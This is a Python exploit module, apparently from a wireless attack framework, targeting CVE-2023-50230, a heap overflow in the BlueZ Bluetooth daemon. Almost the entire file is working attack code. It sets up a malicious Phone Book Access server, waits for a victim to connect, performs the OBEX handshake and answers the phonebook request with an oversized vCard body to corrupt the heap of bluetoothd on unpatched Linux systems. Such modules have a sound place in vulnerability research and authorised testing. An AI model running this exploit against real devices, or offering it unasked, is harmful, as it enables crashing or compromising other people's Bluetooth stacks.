# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """BlueZ Phone Book Access Profile Heap Buffer Overflow (CVE-2023-50230).

    The BlueZ daemon does not validate the size of user-supplied data
    before copying it into a fixed-size heap buffer when processing
    PBAP (Phone Book Access Profile, UUID 0x112f) responses.  An
    attacker acting as a malicious Bluetooth device can advertise a
    PBAP service.  When the victim connects and requests a phonebook
    object, the attacker responds with an OBEX Body header whose
    payload exceeds the heap allocation, overwriting adjacent heap
    metadata and potentially achieving arbitrary code execution in the
    context of the bluetoothd process.

    Exploitation requires the victim to initiate a PBAP connection to
    the attacker-controlled device (user interaction).

    Reported via ZDI.

    CVSS v3.1: 7.1-8.0 (High), AV:A/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "BlueZ PBAP Heap Buffer Overflow (CVE-2023-50230)",
        "description": (
            "Exploits CVE-2023-50230 via a heap buffer overflow in the BlueZ "
            "Phone Book Access Profile handler.  The attacker emulates a PBAP "
            "server that responds to a victim's phonebook pull request with an "
            "oversized OBEX Body header, overflowing a fixed-size heap buffer "
            "inside bluetoothd and corrupting adjacent allocations."
        ),
        "authors": (
            "Zero Day Initiative (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2023-50230",
            "https://www.zerodayinitiative.com/advisories/ZDI-23-1903/",
            "https://linux.oracle.com/cve/CVE-2023-50230.html",
        ),
        "disclosure_date": "2023-12-20",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "BlueZ <= 5.70 (unpatched)",
            "Ubuntu 22.04/23.04 with vulnerable bluetoothd",
            "Fedora 38/39 with vulnerable bluetoothd",
        ),
    }

    target = OptIP("", "Target Bluetooth device address (BD_ADDR)")
    port = OptPort(19, "RFCOMM or OBEX channel for PBAP (default: 19)")
    timeout = OptFloat(10.0, "Socket timeout in seconds")
    overflow_size = OptInteger(4096, "Payload size beyond the heap buffer (bytes)")
    interface = OptString("hci0", "Local Bluetooth adapter")

    # OBEX protocol constants
    _OBEX_CONNECT = 0x80
    _OBEX_CONNECT_RSP = 0xA0
    _OBEX_GET = 0x03
    _OBEX_GET_FINAL = 0x83
    _OBEX_SUCCESS = 0xA0
    _OBEX_HDR_BODY = 0x48
    _OBEX_HDR_END_OF_BODY = 0x49
    _OBEX_HDR_LENGTH = 0xC3
    _OBEX_HDR_TARGET = 0x46
    _OBEX_HDR_WHO = 0x4A
    _OBEX_HDR_NAME = 0x01
    _OBEX_HDR_TYPE = 0x42

    # PBAP target UUID (16 bytes)
    _PBAP_TARGET_UUID = bytes([
        0x79, 0x61, 0x35, 0xF0, 0xF0, 0xC5, 0x11, 0xD8,
        0x09, 0x66, 0x08, 0x00, 0x20, 0x0C, 0x9A, 0x66,
    ])

    # Bluetooth / RFCOMM socket constants
    _BTPROTO_RFCOMM = 3

    def _build_obex_header(self, hdr_id: int, data: bytes) -> bytes:
        """Build a single OBEX header: id (1B) + length (2B BE) + data."""
        length = 3 + len(data)
        return struct.pack(">BH", hdr_id, length) + data

    def _build_obex_connect_response(self) -> bytes:
        """Build an OBEX Connect Success response with the PBAP WHO header."""
        who_hdr = self._build_obex_header(self._OBEX_HDR_WHO, self._PBAP_TARGET_UUID)
        body = struct.pack(">BB", 0x10, 0x00) + struct.pack(">H", 0xFFFF) + who_hdr
        pkt_len = 3 + len(body)
        return struct.pack(">BH", self._OBEX_CONNECT_RSP, pkt_len) + body

    def _build_pbap_response(self, overflow_len: int) -> bytes:
        """Build a PBAP PullPhoneBook response with an oversized Body header.

        The overflow_len parameter controls how far past the heap buffer
        boundary the payload extends.
        """
        vcard_prefix = (
            b"BEGIN:VCARD\r\nVERSION:3.0\r\n"
            b"FN:Overflow Test\r\n"
            b"TEL:+1234567890\r\n"
        )
        padding = b"X" * overflow_len
        vcard_suffix = b"\r\nEND:VCARD\r\n"
        payload = vcard_prefix + padding + vcard_suffix

        body_hdr = self._build_obex_header(self._OBEX_HDR_END_OF_BODY, payload)
        pkt_len = 3 + len(body_hdr)
        return struct.pack(">BH", self._OBEX_SUCCESS, pkt_len) + body_hdr

    def _setup_sdp_record(self) -> dict:
        """Return SDP record attributes for a PBAP PSE service.

        In a real scenario this would be registered via sdptool or
        the BlueZ D-Bus API.  Here we return the record structure
        for documentation and potential programmatic registration.
        """
        return {
            "ServiceClassIDList": ["0x112f"],
            "ProtocolDescriptorList": [
                ("L2CAP",),
                ("RFCOMM", self.port),
                ("OBEX",),
            ],
            "ProfileDescriptorList": [("PhonebookAccess", 0x0102)],
            "ServiceName": "Phonebook Access PSE",
        }

    def _bt_listen(self) -> socket.socket | None:
        """Open a listening RFCOMM socket for PBAP connections."""
        try:
            sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, self._BTPROTO_RFCOMM)
            sock.settimeout(self.timeout)
            sock.bind(("", self.port))
            sock.listen(1)
            return sock
        except OSError:
            return None

    def _bt_scan(self) -> socket.socket | None:
        """Attempt a connection to the target to verify reachability."""
        try:
            sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, self._BTPROTO_RFCOMM)
            sock.settimeout(self.timeout)
            target_addr = self.target if isinstance(self.target, str) else str(self.target)
            sock.connect((target_addr, self.port))
            return sock
        except (OSError, TimeoutError):
            return None

    @mute
    def check(self) -> bool:
        """Verify the target Bluetooth device is reachable via RFCOMM."""
        sock = self._bt_scan()
        if sock is None:
            return False
        sock.close()
        return True

    def run(self) -> None:
        if not self.target:
            print_error("target is required (Bluetooth device address)")
            return

        print_status("Setting up malicious PBAP server and waiting for victim connection")
        self._exploit()

    def _exploit(self) -> None:
        srv = self._bt_listen()
        if srv is None:
            print_error(
                "Failed to open RFCOMM listening socket. "
                "Ensure Bluetooth adapter is available and you have root privileges."
            )
            return

        sdp = self._setup_sdp_record()
        print_status(f"PBAP service record prepared: {sdp['ServiceName']}")
        print_status(
            f"Listening on RFCOMM channel {self.port}; "
            f"overflow payload size: {self.overflow_size} bytes"
        )
        print_info("Waiting for victim to connect to the PBAP service...")

        try:
            client, addr = srv.accept()
        except (OSError, TimeoutError):
            print_error("No connection received within timeout")
            srv.close()
            return

        print_success(f"Connection from {addr[0]}")

        try:
            obex_req = client.recv(4096)
            if not obex_req or obex_req[0] != self._OBEX_CONNECT:
                print_error("Expected OBEX Connect request, got unexpected data")
                client.close()
                srv.close()
                return

            connect_rsp = self._build_obex_connect_response()
            client.send(connect_rsp)
            print_status("Sent OBEX Connect response with PBAP WHO UUID")

            get_req = client.recv(4096)
            if not get_req or (get_req[0] & 0x7F) != (self._OBEX_GET & 0x7F):
                print_error("Expected OBEX GET request for phonebook, got unexpected data")
                client.close()
                srv.close()
                return

            print_status("Received phonebook pull request; sending oversized response")
            overflow_response = self._build_pbap_response(self.overflow_size)
            client.send(overflow_response)

            time.sleep(0.5)

            print_success(
                f"Oversized PBAP response delivered ({len(overflow_response)} bytes). "
                f"If bluetoothd is vulnerable, the heap buffer has been overflowed. "
                f"Monitor the target for crashes or abnormal behavior."
            )

        except OSError as e:
            print_error(f"Connection error during exploit: {e}")
        finally:
            client.close()
            srv.close()
